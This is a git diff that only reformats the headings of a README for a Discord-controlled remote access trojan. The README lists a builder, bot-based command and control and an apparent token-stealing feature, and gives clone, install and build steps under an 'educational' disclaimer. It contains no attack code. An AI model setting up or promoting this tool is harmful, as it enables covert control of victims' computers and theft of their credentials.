@@ -1,7 +1,7 @@
 # BestDiscordRAT  
 **Discord Remote Access Tool — Educational & Preventive Purpose**
 
-## > Table of Contents
+## Table of Contents
 - [About](#about)
 - [Features](#features)
 - [Installation](#installation)
@@ -11,12 +11,12 @@
 - [License](#license)
 - [Disclaimer](#disclaimer)
 
-## > About  
+## About  
 BestDiscordRAT is a Python-based demonstration tool that showcases how a Discord-powered Remote Access Tool (RAT) operates.  
 It is designed **exclusively for educational, defensive, and preventive cybersecurity purposes** in controlled environments.  
 The project aims to help students, researchers, and security enthusiasts understand RAT behavior, strengthen detection skills, and improve defensive strategies.
 
-## > Features  
+## Features  
 - Discord bot used as Command & Control  
 - Graphical user interface for building (`GUI.py`)  
 - Automatic builder (`Builder.bat`)  
@@ -29,7 +29,7 @@ The project aims to help students, researchers, and security enthusiasts underst
 
 And many more, see [Screenshots](#screenshots).
 
-## > Installation  
+## Installation  
 Clone the repository:
 ```bash
 git clone https://github.com/NoonePYDEV/BestDiscordRAT
@@ -50,7 +50,7 @@ Install dependencies:
 pip install -r requirements.txt
 ```
 
-## > Usage  
+## Usage  
 Run the GUI:
 ```bash
 python GUI.py
@@ -63,13 +63,13 @@ Builder.bat
 
 Configure your Discord bot token, channel IDs, and other parameters inside the configuration files or directly in the script (depending on your setup).
 
-## > Screenshots
+## Screenshots
 
 ![Builder](./Screenshots/Builder.png)
 <br>
 ![Emergency Tokens](./Screenshots/EmTokens.png)
 
-## > Ethical & Safety Notice  
+## Ethical & Safety Notice  
 This project is strictly intended for:  
 - Security education  
 - Malware analysis practice  
@@ -79,7 +79,7 @@ This project is strictly intended for:
 Do **not** deploy this tool on any machine you do not own or manage.  
 Unauthorized use is illegal and strictly prohibited.
 
-## > License  
+## License  
 This project is released under the license included in the repository.
 
 ## ⚠️ Disclaimer  
